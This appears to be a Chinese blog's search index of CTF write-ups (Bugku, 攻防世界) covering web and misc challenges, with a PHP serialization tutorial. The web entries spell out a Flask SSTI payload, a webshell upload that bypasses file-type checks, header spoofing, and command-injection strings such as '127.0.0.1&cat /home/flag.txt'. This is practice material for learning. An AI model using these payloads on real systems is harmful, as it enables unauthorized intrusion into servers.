<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>bugkuweb</title>
    <link href="/2023/05/05/bugkuweb/"/>
    <url>/2023/05/05/bugkuweb/</url>
    
    <content type="html"><![CDATA[<h3 id="1-滑稽"><a href="#1-滑稽" class="headerlink" title="1.滑稽"></a>1.滑稽</h3><p>F12查看即可，又是考视力&#x3D; &#x3D;</p><p><img src="%E6%BB%91%E7%A8%BD.png" alt="滑稽"></p><hr><h3 id="2-计算器"><a href="#2-计算器" class="headerlink" title="2.计算器"></a>2.计算器</h3><p>小学算数，答案是111，但是输入1之后就输入不进去了，直接改前端代码</p><p><img src="%E8%AE%A1%E7%AE%97%E5%99%A8.png" alt="计算器"></p><p>把maxlength删了或者把1改大一点就行了，提交</p><hr><h3 id="3-GET"><a href="#3-GET" class="headerlink" title="3.GET"></a>3.GET</h3><p><img src="GET1.png" alt="GET"></p><p>简单的代码审计，直接GET传参</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">what</span>=flag<br></code></pre></td></tr></table></figure><p><img src="GET2.png" alt="GET2"></p><hr><h3 id="4-Simple-SSTI-1"><a href="#4-Simple-SSTI-1" class="headerlink" title="4.Simple_SSTI_1"></a>4.Simple_SSTI_1</h3><p>页面提示我需要绕过一个叫flag的参数，然后F12说：你知道，在烧瓶里，我们经常设置一个secret_key变量。 </p><p>![Simple_SSTI_1.1]Simple_SSTI_1.1.png)</p><p>flask的模板注入：（注意：这里的SECRET_KEY需要大写）</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">？flag=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.SECRET_KEY</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="Simple_SSTI_1.2.png" alt="Simple_SSTI_1.2"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>bugku</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>难度3</title>
    <link href="/2023/04/27/web03/"/>
    <url>/2023/04/27/web03/</url>
    
    <content type="html"><![CDATA[<h3 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h3><p>先试了一下万能密码，没成，然后用bp跑了一下字典，也没成功，想到robots.txt，发现Disallow：&#x2F;user.php.bak</p><p><img src="fakebook1.png" alt="fakebook1"></p><p>访问后下载了网页源码</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>攻防世界</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>难度1</title>
    <link href="/2023/04/22/misc01/"/>
    <url>/2023/04/22/misc01/</url>
    
    <content type="html"><![CDATA[<h2 id="记两道润天杯校赛的题"><a href="#记两道润天杯校赛的题" class="headerlink" title="记两道润天杯校赛的题"></a>记两道润天杯校赛的题</h2><h3 id="1-misc-1"><a href="#1-misc-1" class="headerlink" title="1.misc_1"></a>1.misc_1</h3><p>解压之后是一张图片，用01editor打开，由于是jpg图片，直接搜FFD9</p><p><img src="misc_1.1.png" alt="misc_1.1"></p><p>看见后面有pk，得知是zip，直接另存为zip，打开就拿到flag了</p><hr><h3 id="2-misc-2"><a href="#2-misc-2" class="headerlink" title="2. misc_2"></a>2. misc_2</h3><p>打开图片属性，看到这：</p><p><img src="misc_2.png" alt="misc_2"></p><p>社会主义核心价值观加密，直接复制版权信息解密两次就行了，<a href="http://www.atoolbox.net/Tool.php?Id=850">在线工具</a></p><p><strong>在这里感谢x2658y大佬给讲题~</strong></p><hr><h2 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h2><h3 id="1-Banmabanma"><a href="#1-Banmabanma" class="headerlink" title="1.Banmabanma"></a>1.Banmabanma</h3><p>一张图，先记事本打开，没收获，就去stegsolve看了一下，用手机扫也没结果，不知道是不是我的问题&#x3D; &#x3D;，ida也是一无所获</p><p>最后去网上看wp，发现了一个叫条形码在线阅读的网站 <a href="https://online-barcode-reader.inliteresearch.com/">Barcode Reader. Free Online Web Application</a></p><p>把图片放进去就拿到flag了</p><p><img src="Banmabanma.png" alt="Banmabanma"></p><hr><h3 id="2-适合作为桌面"><a href="#2-适合作为桌面" class="headerlink" title="2.适合作为桌面"></a>2.适合作为桌面</h3><p>先从简单的入手，记事本打开，没找到flag，然后用stegsolve打开，找到了一个二维码：</p><p><img src="%E9%80%82%E5%90%88%E4%BD%9C%E4%B8%BA%E6%A1%8C%E9%9D%A21.png" alt="适合作为桌面1"></p><p>还是去上一题提到的那个网站扫一下二维码看看：</p><p><img src="%E9%80%82%E5%90%88%E4%BD%9C%E4%B8%BA%E6%A1%8C%E9%9D%A22.png" alt="适合作为桌面2"></p><p>（stegsolve换图层的过程中我发现有的二维码是扫不了的）</p><p>得到了一串16进制的数字</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">03</span>F30D0A79CB05586300000000000000000100000040000000730D0000006400008400005A000064010053280200000063000000000300000016000000430000007378000000640100640200640300640400640500640600640700640300640800640900640A00640600640B00640A00640700640800640C00640C00640D00640E00640900640F006716007D00006410007D0100781E007C0000445D16007D02007C01007400007C0200830100377D0100715500577C010047486400005328110000004E6966000000696C00000069610000006967000000697B000000693300000069380000006935000000693700000069300000006932000000693400000069310000006965000000697D000000740000000028010000007403000000636872280300000074030000007374727404000000666C6167740100000069280000000028000000007304000000312E7079520300000001000000730A0000000001480106010D0114014E280100000052030000002800000000280000000028000000007304000000312E707974080000003C6D6F64756C653E0100000<span class="hljs-number">07300000000</span><br></code></pre></td></tr></table></figure><p>03F30D0A是pyc文件</p><p><strong>pyc文件</strong>：是由Python文件经过编译后所生成的文件，众所周知Python的运行性能不如编译性语言(比如C语言)，所以Python在程序执行结束后会把字节码写入到硬盘中，保存为.pyc文件，目的是下一次再执行python xxx.py程序时，Python会先在目录下找xxx.pyc文件来执行</p><p>01editor打开如下：</p><p><img src="%E9%80%82%E5%90%88%E4%BD%9C%E4%B8%BA%E6%A1%8C%E9%9D%A23.png" alt="适合作为桌面3"></p><p><strong>依然在这里感谢x2658y</strong>，要不然我还傻了吧唧写成txt，正确做法应该是放到01editor另存为pyc文件</p><p>然后去反编译：</p><p><a href="https://tool.lu/pyc/">python反编译在线工具</a></p><p>得到如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># visit https://tool.lu/pyc/ for more information</span><br><span class="hljs-comment"># Version: Python 2.7</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-built_in">str</span> = [<br>        <span class="hljs-number">102</span>,<br>        <span class="hljs-number">108</span>,<br>        <span class="hljs-number">97</span>,<br>        <span class="hljs-number">103</span>,<br>        <span class="hljs-number">123</span>,<br>        <span class="hljs-number">51</span>,<br>        <span class="hljs-number">56</span>,<br>        <span class="hljs-number">97</span>,<br>        <span class="hljs-number">53</span>,<br>        <span class="hljs-number">55</span>,<br>        <span class="hljs-number">48</span>,<br>        <span class="hljs-number">51</span>,<br>        <span class="hljs-number">50</span>,<br>        <span class="hljs-number">48</span>,<br>        <span class="hljs-number">56</span>,<br>        <span class="hljs-number">53</span>,<br>        <span class="hljs-number">52</span>,<br>        <span class="hljs-number">52</span>,<br>        <span class="hljs-number">49</span>,<br>        <span class="hljs-number">101</span>,<br>        <span class="hljs-number">55</span>,<br>        <span class="hljs-number">125</span>]<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        flag += <span class="hljs-built_in">chr</span>(i)<br>    <br>    <span class="hljs-built_in">print</span> flag<br>flag() //反编译没这一行，我们需要调用flag()<br></code></pre></td></tr></table></figure><p>注释提到是python2.7，所以直接去<a href="https://c.runoob.com/compile/6/">在线编译</a></p><p>这里flag()要顶格，我不知道为什么，<del>但我大为震撼</del></p><p>最后得到了flag：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">38</span>a57032085441e7&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="3-心仪的公司"><a href="#3-心仪的公司" class="headerlink" title="3.心仪的公司"></a>3.心仪的公司</h3><p>这道题是wireshark的包，借此机会学习一下wireshark的<a href="https://blog.csdn.net/yeyiqun/article/details/99310715">颜色规则</a></p><p>这个流量包叫webshell，故在显示过滤器中输入：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span> <span class="hljs-keyword">contains</span><span class="hljs-string">&quot;webshell&quot;</span><br></code></pre></td></tr></table></figure><p><img src="%E5%BF%83%E4%BB%AA%E7%9A%84%E5%85%AC%E5%8F%B81.png" alt="心仪的公司1"></p><p>追踪TCP流，找到flag</p><p><img src="%E5%BF%83%E4%BB%AA%E7%9A%84%E5%85%AC%E5%8F%B82.png" alt="心仪的公司2"></p><p>还有一种方法，在kali里输入</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">strings webshell.pcapng <span class="hljs-string">| grep &quot;</span>&#123;<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><strong>命令的意思是在webshell这个包里过滤含有”{“的字符串，然后输出</strong></p><p>这里我是照着大佬们的wp写的，但是我这里输出了很多行，所以我改一下：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">strings webshell.pcapng <span class="hljs-string">| grep &quot;</span>fl4g<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="%E5%BF%83%E4%BB%AA%E7%9A%84%E5%85%AC%E5%8F%B83.png" alt="心仪的公司3"></p><p><del>这里有点面向结果了</del>，正常解的话应该是先grep”flag“，可以看到没收获，这时可以试试fl4g</p><p><strong>strings命令</strong> 在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。</p><p><strong>管道符</strong>：|</p><p><strong>作用</strong>：管道是一种通信机制，通常用于进程间的通信。它表现出来的形式将前面每一个进程的输出（stdout）直接作为下一个进程的输入</p><p>ls &#x2F; | grep “y“</p><p>grep 指令用于“过滤”<br>grep 语法：grep 选项 文件路径&#x2F;内容</p><p>针对上面这个命令说明：<br>① 以管道作为分界线，前面的命令有个输出，后面需要先输入（缺少查找范围），然后再过滤，最后再输出，通俗的讲就是管道前面的输出就是后面指令的输入。<br>为了便于理解，上述的指令变相实现可以如下：</p><p>ls &#x2F; &gt; xxx.txt 将ls &#x2F;的结果保存到xxx.txt文件中</p><p>grep “y” xxx.txt 使用grep指令搜索xxx.txt中的包含y的行</p><hr><h3 id="4-pure-color"><a href="#4-pure-color" class="headerlink" title="4.pure_color"></a>4.pure_color</h3><p>是一张图片，直接放到stegsolve中</p><p><img src="pure_color1.png" alt="pure_color1"></p><p>比较简单flag{true_steganographers_doesnt_need_any_tools}</p><p>不过这个题的flag挺有意思，他说真正的隐写技师不需要任何工具 [狗头]</p><hr><h3 id="5-2017-Dating-in-Singapore"><a href="#5-2017-Dating-in-Singapore" class="headerlink" title="5.2017_Dating_in_Singapore"></a>5.2017_Dating_in_Singapore</h3><p>题目名字叫新加坡2017年的日历，打开也是个日历，有点意思</p><p><img src="2017_Dating_in_Singapore1.png" alt="2017_Dating_in_Singapore1"></p><p><a href="https://blog.csdn.net/qq_42016346/article/details/104234416">wp</a></p><hr><h3 id="6-simple-transfer"><a href="#6-simple-transfer" class="headerlink" title="6.simple_transfer"></a>6.simple_transfer</h3><p>题目描述: 文件里有flag，找到它。</p><p>下载了一个pcap的流量包，网上的wp都过滤了很多nfs，然后找到了file.pdf，这也是后面为什么分离pdf的原因，但是我这就两条，<del>我不懂</del></p><p>直接扔到kali里输入命令：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">binwalk</span> <span class="hljs-number">1</span>.pcap<br></code></pre></td></tr></table></figure><p>发现有一个pdf文件，接着输入</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">foremost -t pdf -<span class="hljs-selector-tag">i</span> <span class="hljs-number">1</span><span class="hljs-selector-class">.pcap</span> <br></code></pre></td></tr></table></figure><p>-t为指定文件类型，-i是指定输入，-o是指定输出，这里没指出，默认给出output文件夹：</p><p><img src="simple_transfer1.png" alt="simple_transfer1"></p><p>然后打开文件夹：</p><p><img src="simple_transfer2.png" alt="simple_transfer2"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>攻防世界</category>
      
      <category>Misc</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>序列化</title>
    <link href="/2023/04/21/%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/04/21/%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>在我看完<a href="https://m.php.cn/article/358919.html">这篇文章</a>后，我终于懂了一些关于序列化的知识：</p><p>serialize() 函数会检查类中是否存在魔术方法比如 __sleep()。如果存在，则该方法会优先被调用，然后才执行序列化操作。</p><p>先看代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span></span>&#123;<br><br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$name</span>;   <br><br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$sex</span>;    <br><br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$age</span>;    <br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$sex</span> = <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$age</span> = <span class="hljs-string">&quot;&quot;</span></span>) </span>&#123;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;        <br><br>        <span class="hljs-variable language_">$this</span>-&gt;sex = <span class="hljs-variable">$sex</span>;        <br><br>        <span class="hljs-variable language_">$this</span>-&gt;age = <span class="hljs-variable">$age</span>;<br><br>    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">say</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我的名字叫：&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;name . <span class="hljs-string">&quot; 性别：&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;sex . <span class="hljs-string">&quot; 我的年龄是：&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;age . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br>    &#125;    <span class="hljs-comment">//指定串行化时把返回的数组中$name和$age值串行化，忽略没在数组中的属性$sex</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sleep</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>        <span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>); <span class="hljs-comment">// 此时，属性$sex将被删除！！！</span><br><br>        <span class="hljs-keyword">return</span>(<span class="hljs-variable">$arr</span>);<br><br>    &#125;    <span class="hljs-comment">//重新生成对象时，并重新赋值$age为40</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;age = <span class="hljs-number">40</span>;<br><br>    &#125;<br><br>&#125;<span class="hljs-variable">$p1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;张三&quot;</span>, <span class="hljs-string">&quot;男&quot;</span>, <span class="hljs-number">20</span>);<span class="hljs-comment">//把一个对象串行化，返一个字符串，调用了sleep()方法,忽略没在数组中的属性</span><br><br><span class="hljs-variable">$p1_string</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$p1</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$p1_string</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">//串行化的字符串我们通常不去解析</span><br><br><span class="hljs-variable">$p2</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$p1_string</span>); <span class="hljs-comment">//反串行化形成对象$p2重新赋值</span><br><br><span class="hljs-comment">//此时$age为40</span><br><br><span class="hljs-variable">$p2</span>-&gt;<span class="hljs-title function_ invoke__">say</span>();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>1.sleep()函数会在序列化时被调用，比如我现在有一个Person类，有name，sex和age三个变量，并且类中有 __sleep()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sleep</span>(<span class="hljs-params"></span>) </span><br><span class="hljs-function"> </span>&#123;<br>       <span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>); <span class="hljs-comment">// 此时，属性$sex将被删除！！！</span><br>       <span class="hljs-keyword">return</span>(<span class="hljs-variable">$arr</span>);<br> &#125;<br><span class="hljs-variable">$p1</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;张三&quot;</span>, <span class="hljs-string">&quot;男&quot;</span>, <span class="hljs-number">20</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$p1</span>);<br></code></pre></td></tr></table></figure><p>会输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Person&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;张三&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">20</span>;&#125;<br></code></pre></td></tr></table></figure><p>他们分别表示：<br>变量类型:类名长度:类名:属性数量：{属性类型:属性名长度:属性名；属性值类型:属性值长度:属性值内容}</p><p>O（object）表示对象，因为$p1是类Person的一个对象</p><p>这里我们可以看到，创建类对象时，是有“男”这一属性的，但由于调用了 __sleep()，这一属性消失了，并且序列化后的属性数量由3变为了2，而当我最后使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$p2</span>-&gt;<span class="hljs-title function_ invoke__">say</span>();<br></code></pre></td></tr></table></figure><p>由于$p2是反序列化后的$p1，而反序列化时又会调用wakeup函数，它修改了age的值</p><p>故返回值为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">我的名字叫：张三 性别： 我的年龄是：<span class="hljs-number">40</span><br></code></pre></td></tr></table></figure><p>可以看到，性别这一变量为空并且age为40</p><p>总结一下调用顺序：</p><div align="center">serialize()   -------> sleep()</div><div align="center">unserialize()    -------> wakeup()</div>]]></content>
    
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>难度2</title>
    <link href="/2023/04/05/web02/"/>
    <url>/2023/04/05/web02/</url>
    
    <content type="html"><![CDATA[<h2 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a><strong>攻防世界</strong></h2><h3 id="1-NewsCenter"><a href="#1-NewsCenter" class="headerlink" title="1.NewsCenter"></a>1.NewsCenter</h3><hr><h3 id="2-upload1"><a href="#2-upload1" class="headerlink" title="2.upload1"></a>2.upload1</h3><p>直接上传shell.php</p><p><img src="upload11.png" alt="upload11"></p><p>果然没这么简单，上传现成的图片马4.jpg（难度1中用过）</p><p><img src="upload12.png" alt="upload12"></p><p>传了图片马之后，要想办法让它被解析，分布式配置文件依然被拦，想到难度1中用过.user.ini，再试一下</p><p>内容为：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><br><span class="hljs-attribute">auto_prepend_file</span>=4.jpg<br></code></pre></td></tr></table></figure><p>当我想用burp改包的时候，我发现已经被拦了，再一细看，上传按钮不能点，我立刻想到难度1不能按的按钮，果不其然，直接删掉disabled&#x3D;””   </p><p>ps:写到这不得不说一句，难度顺序排的是真好，前面刚做过这里就用上了。</p><p><img src="upload13.png" alt="upload13"></p><p>依然是把内容类型改为image&#x2F;jpg，上传成功。</p><p><img src="upload14.png" alt="upload14"></p><p>但是名字被改了，.user.ini前面多了一串数字，显然失败了。<del>早该想到的</del></p><p><del>高端的食材往往采用最朴素的烹饪方式</del>，放大招：</p><p>直接上传4.jpg，burp改包，改成4.php，根据路径，蚁剑连接，getshell</p><p><img src="upload15.png" alt="upload15"></p><p>最后成功找到flag</p><p><img src="upload16.png" alt="upload16"></p><hr><h3 id="3-xff-referer"><a href="#3-xff-referer" class="headerlink" title="3.xff_referer"></a>3.xff_referer</h3><p>题目描述: X老师告诉小宁其实xff和referer是可以伪造的。</p><p>进入环境，页面有一句话：ip地址必须为123.123.123.123</p><h4 id="xff："><a href="#xff：" class="headerlink" title="xff："></a>xff：</h4><p>很多HTTP代理会在HTTP协议头中添加X-Forwarded-For头，用来追踪请求的来源。</p><p>X-Forwarded-For的格式如下：</p><pre><code class="hljs">X-Forwarded-For: client1, proxy1, proxy2</code></pre><p>X-Forwarded-For包含多个IP地址，每个值通过逗号+空格分开，最左边（client1）是最原始客户端的IP地址，如果有多层代理，每一层代理会将连接它的客户端IP追加在X-Forwarded-For右边。</p><p>一般的客户端发送HTTP请求没有X-Forwarded-For头的，当请求到达第一个代理服务器时，代理服务器会加上X-Forwarded-For请求头，并将值设为客户端的IP地址（也就是最左边第一个值），后面如果还有多个代理，会依次将IP追加到X-Forwarded-For头最右边，最终请求到达Web应用服务器，应用通过获取X-Forwarded-For头取左边第一个IP即为客户端真实IP。</p><p>但是如果客户端在发起请求时，请求头上带上一个伪造的X-Forwarded-For，由于后续每层代理只会追加而不会覆盖，那么最终到达应用服务器时，获取的左边第一个IP地址将会是客户端伪造的IP。伪造X-Forwarded-For头只需加上X-Forwarded-For头就可以</p><h4 id="referer："><a href="#referer：" class="headerlink" title="referer："></a>referer：</h4><p>HTTP 请求的头信息里面，Referer 是一个常见字段，提供访问来源的信息。这个字段是可选的。客户端发送请求的时候，自主决定是否加上该字段。</p><p>以上摘自CSDN博主<a href="https://blog.csdn.net/weixin_45746283/article/details/127876705">「Arik0」的文章</a></p><p>了解到以上知识后，我们就知道该怎么做了，burp抓包，提交：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-For:<span class="hljs-number">123.123.123.123</span><br></code></pre></td></tr></table></figure><p>页面又提示必须来自<a href="https://www.google.com，该referer登场了：">https://www.google.com，该referer登场了：</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">Referer：https:<span class="hljs-regexp">//</span>www.google.com<br></code></pre></td></tr></table></figure><p> <img src="xff_referer.png" alt="xff_referer"></p><p>注意，<strong>这里的xff和referer要在请求头中</strong></p><hr><h3 id="4-command-execution"><a href="#4-command-execution" class="headerlink" title="4.command_execution"></a>4.command_execution</h3><p>题目描述: 小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。</p><p>先学习一下，Windows或Linux下命令执行漏洞要用到的</p><table><thead><tr><th align="left">分隔符</th><th align="left">用法</th><th>解释</th></tr></thead><tbody><tr><td align="left">;</td><td align="left">A;B</td><td>先执行A，在执行B</td></tr><tr><td align="left">&amp;</td><td align="left">A&amp;B</td><td>简单拼接，互不影响</td></tr><tr><td align="left">|</td><td align="left">A|B</td><td>显示B的执行结果</td></tr><tr><td align="left">&amp;&amp;</td><td align="left">A&amp;&amp;B</td><td>A执行成功才会执行B</td></tr><tr><td align="left">||</td><td align="left">A||B</td><td>A执行失败，然后才会执行B</td></tr></tbody></table><p>命令执行，想到命令行，dir行不通，就ls，可以得知是linux操作系统，这一点根据后门文件夹也能看出来</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;ls /<br></code></pre></td></tr></table></figure><p><img src="command_execution1.png" alt="command_execution1"></p><p>查找文件名中含有flag的文件</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;find / -name <span class="hljs-string">&quot;flag*&quot;</span><br></code></pre></td></tr></table></figure><p><img src="command_execution2.png" alt="command_execution2"></p><p>找到flag.txt，打开，拿到flag。（Windows的查看文件内容命令是type）</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;cat /home/flag.txt<br></code></pre></td></tr></table></figure><hr><h3 id="5-web2"><a href="#5-web2" class="headerlink" title="5.web2"></a>5.web2</h3><p>又是学习php的一题，上菜：</p><p><img src="web21.png" alt="web21"></p><p>先时将flag字符串逆序，</p><p>然后每一个ascii码数值+1，</p><p>然后base64加密，</p><p>然后逆序，</p><p>然后再rot13加密</p><p>得到加密的密文：a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws</p><p>写个php就行了，结果如图：</p><p><img src="web22.png" alt="web22"></p><p>ps：<strong>rot13加密和解密是同一个函数</strong></p><p>附<a href="https://c.runoob.com/compile/1/">php在线编码</a></p><hr><h3 id="6"><a href="#6" class="headerlink" title="6."></a>6.</h3>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>攻防世界</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>前言</title>
    <link href="/2023/03/30/%E5%89%8D%E8%A8%80/"/>
    <url>/2023/03/30/%E5%89%8D%E8%A8%80/</url>
    
    <content type="html"><![CDATA[<p>为了这个博客，我花了一个星期TAT，<del>真来之不易</del>， 从零开始，通过搭网站debug又学到了一些东西，后面会记录一些<del>大佬学习笔记</del></p><p>​                              To                                                      Be                                          Continue</p>]]></content>
    
    
    <categories>
      
      <category>pre</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>难度1</title>
    <link href="/2023/03/26/web01/"/>
